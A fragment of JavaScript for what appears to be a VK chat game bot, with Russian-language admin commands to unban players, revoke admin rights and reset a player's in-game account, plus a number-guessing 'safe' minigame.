	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.ban = false;

	return bot(`Игрок разблокирован`);
});
cmd.hear(/^(?:AdmDell)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret2) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.admlevel = false;

	return bot(`Игрок снят!`);
});
cmd.hear(/^(?:givebt)\s([0-9]+)$/i, async (message, bot) => {
	return bot(`CMD DELL`);
});
cmd.hear(/^(?:DellAcc)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret2) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.btc = 0;
	user.table = 0;
	user.pitom = 0;
	user.cam = 0;
	user.copter = 0;
	user.fotik = 0;
	user.moto = 0;
	user.admlevel = false;
	user.farm_btc = 0;
	user.bank = 0;
	user.biz = 0;
	user.rating	= 0;
	user.balance = 0;
	user.tag = " vk.com/roman_akular "
	user.work = 0;
	user.business = 0;
	user.exp = 1;
	user.level = 1;	
		

	return bot(`Ok...`);
});


cmd.hear(/^(?:сейф)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.timers.safe) return bot(`Взломать сейф можно 1 раз в час!`);
	let prize = utils.pick([1]);

	setTimeout(() => {
		message.user.timers.safe = false;
	}, 3600000);

	message.user.timers.safe = true;
	
	if(message.args[1] < 10 || message.args[1] >= 100) return;

	const int = utils.random(10, 99);
	message.args[1] = Number(message.args[1]);

	if(int === message.args[1])
	{
		message.user.balance += 100;
		return bot(`невероятно! Вы угадали число.
		💲 Вам начислено 100$`);
	} else if(int !== message.args[1])
	{
		return bot(`вы не угадали число. Вам выпало число "${int}"
		🎉 Не отчаивайтесь, количество попыток неограниченно.
		
		Если вы угадаете код, то вы получите 100$`);
	}
});